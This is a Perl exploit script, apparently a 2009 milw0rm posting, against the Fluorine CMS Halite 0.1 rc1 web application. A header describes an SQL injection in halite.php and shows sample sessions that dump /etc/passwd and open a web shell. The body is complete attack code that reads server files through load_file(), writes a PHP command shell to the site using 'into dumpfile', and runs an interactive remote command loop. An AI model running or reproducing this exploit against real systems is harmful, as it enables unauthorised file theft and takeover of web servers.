#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :  Fluorine CMS - Halite 0.1 rc 1                                                                                 |
# |Download        :  http://garr.dl.sourceforge.net/sourceforge/fluorine/halite-0.1rc1.rar                                          |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote Exploit (File Disclosure + Remote Command Execution via Sql Injection)                                                     |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Thx&Greets to: evilsocket, Fireshot, Todd and str0ke                                                                              |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |BUG [Sql Injection]
# |  p0c : /[path]/halite.php?action=aff&id=[sql_string]
# |----------------------------------------------------------------------------------------------------------------------------------|
# |This CMS is vulnerable to sql injection. The exploit just use load_file() mysql function to disclosure local file on the server,
# |and uses the '' into dumpfile '' mysql function to save a php shell on the website, so it will allows you to execute commands.
# |The RCE way is more difficult, becouse you need to know the site's path on the server, dumpfile function needs it !
# |----------------------------------------------------------------------------------------------------------------------------------|

# -----------------------------------------------------------------------------------------------
# Exploit in action [>!]
# -----------------------------------------------------------------------------------------------
# osirys[~]>$ perl xploit.txt http://localhost/cms0/ file_disc
#
#   -------------------------------------
#        Fluorine CMS Remote Exploit
#              Coded by Osirys
#   -------------------------------------
#
# [*] cat /etc/passwd
# root:x:0:0::/root:/bin/bash
# bin:x:1:1:bin:/bin:/bin/false
# daemon:x:2:2:daemon:/sbin:/bin/false
# adm:x:3:4:adm:/var/log:/bin/false
# lp:x:4:7:lp:/var/spool/lpd:/bin/false
# sync:x:5:0:sync:/sbin:/bin/sync
# shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
# halt:x:7:0:halt:/sbin:/sbin/halt
# mail:x:8:12:mail:/:/bin/false
# news:x:9:13:news:/usr/lib/news:/bin/false
# uucp:x:10:14:uucp:/var/spool/uucppublic:/bin/false
# operator:x:11:0:operator:/root:/bin/bash
# games:x:12:100:games:/usr/games:/bin/false
# ftp:x:14:50::/home/ftp:/bin/false
# smmsp:x:25:25:smmsp:/var/spool/clientmqueue:/bin/false
# mysql:x:27:27:MySQL:/var/lib/mysql:/bin/false
# rpc:x:32:32:RPC portmap user:/:/bin/false
# sshd:x:33:33:sshd:/:/bin/false
# gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
# apache:x:80:80:User for Apache:/srv/httpd:/bin/false
# messagebus:x:81:81:User for D-BUS:/var/run/dbus:/bin/false
# haldaemon:x:82:82:User for HAL:/var/run/hald:/bin/false
# pop:x:90:90:POP:/:/bin/false
# nobody:x:99:99:nobody:/:/bin/false
# osirys:x:1000:100:Giovanni,,,:/home/osirys:/bin/bash

# [*] cat exit
# [-] Quitting ..
# osirys[~]>$
# -----------------------------------------------------------------------------------------------
# osirys[~]>$ perl xploit.txt http://localhost/cms0/ cmd /home/osirys/web/cms0/
#
#   -------------------------------------
#        Fluorine CMS Remote Exploit
#              Coded by Osirys
#   -------------------------------------
#
# [*] Injectin php shell thou Sql Injection
# [*] Shell succesfully injected !
# [&] Hi my master, do your job now [!]
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> whoami
# apache
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# -----------------------------------------------------------------------------------------------

use LWP::UserAgent;
use HTTP::Request::Common;

my $host   = $ARGV[0];
my $expl   = $ARGV[1];
my $fpath  = $ARGV[2];

my $sql_inj_path = "/halite.php?action=aff&id=";
my $gen_sql_inj  = "-1 union all select 1,2,3,4,";
my $php_c0de   =  "<?php echo \"st4rt\";if(get_magic_quotes_gpc()){ \$_GET[".
                  "cmd]=stripslashes(\$_GET[cmd]);} system(\$_GET[cmd]);?>";

$fpath = "/x" if ($expl =~ /file_disc/);
($host,$expl,$fpath) || help("-1");
cheek($host,$expl,$fpath) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&file_discl if $expl_way == 1;
&cmd if $expl_way == 2;

sub file_discl {
    print "[*] cat ";
    my $file = <STDIN>;
    chomp($file);
    $file !~ /exit/ || die "[-] Quitting ..\n";
    if ($file !~ /\/(.*)/) {
        print "\n[-] Bad filename !\n";
        &file_discl;
    }
    my $sql_inj = $sql_inj_path.$gen_sql_inj."load_file(\"".$file."\")";
    my $attack  = $host.$sql_inj;
    my $re = get_req($attack);
    my $content = tag($re);
    if ($content =~ /<td\$class="corpsnews">\*\*(.*)(\*\*|\*\*\*)\$\$<\/td>\*\*\$<\/tr>/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        $out =~ s/$out/$out\n/ if ($out !~ /\n$/);
        print "$out\n";
        &file_discl;
    }
    elsif ($content =~ /<td\$class="corpsnews">\*\*\*\*\$\$<\/td>\*\*\$<\/tr>/) {
        $c++;
        print "[-] Can't find ".$file." \n";
        $c < 3 || die "[-] File Disclosure failed !\n[-] Something wrong. Exploit Failed !\n\n";
        &file_discl;
    }
}

sub cmd {
    print "[*] Injectin php shell thou Sql Injection\n";
    my $sql_inj = $sql_inj_path.$gen_sql_inj."'".$php_c0de."' into dumpfile '".$fpath."/shell.php'";
    my $attack  = $host.$sql_inj;
    get_req($attack);
    my $test = get_req($host."shell.php");
    if ($test =~ /st4rt/) {
        print "[*] Shell succesfully injected !\n";
        print "[&] Hi my master, do your job now [!]\n\n";
        $exec_path = $host."/shell.php";
        &exec_cmd;

    }
    else {
        print "[-] Shell not found \n[-] Exploit failed\n\n";
        exit(0);
    }
}

sub exec_cmd() {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    my $exec_url = $exec_path."?cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ /st4rt(.*)/) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub cheek() {
    my $host  = $_[0];
    my $expl  = $_[1];
    my $fpath = $_[2];
    if ($host =~ /http:\/\/(.*)/) {
        $ch_host = 1;
    }
    if ($expl =~ /file_disc/) {
        $ch_expl = 1;
        $ch_fpath = 1;
        $expl_way = 1;
    }
    elsif ($expl =~ /cmd/) {
        $ch_expl = 1;
        $expl_way = 2;
    }
    if ($fpath =~ /\/(.*)/) {
        $ch_fpath = 1;
    }
    return 1 if ((($ch_host)&&($ch_expl)&&($ch_fpath)) == 1);
    &help("-2");
}

sub banner {
    print "\n".
          "  ------------------------------------- \n".
          "       Fluorine CMS Remote Exploit      \n".
          "             Coded by Osirys            \n".
          "  ------------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input Error, missed some arguments !\n\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad arguments !\n\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path file_disc file\n";
    print "    Ex:     perl $0 http://site.it/cms/      file_disc /etc/passwd\n";
    print "[*] Usage : perl $0 http://hostname/cms_path cmd path_of_site\n";
    print "    Ex:     perl $0 http://site.it/cms/      cmd /home/osirys/web/cms/\n\n";
    exit(0);
}

# milw0rm.com [2009-02-10]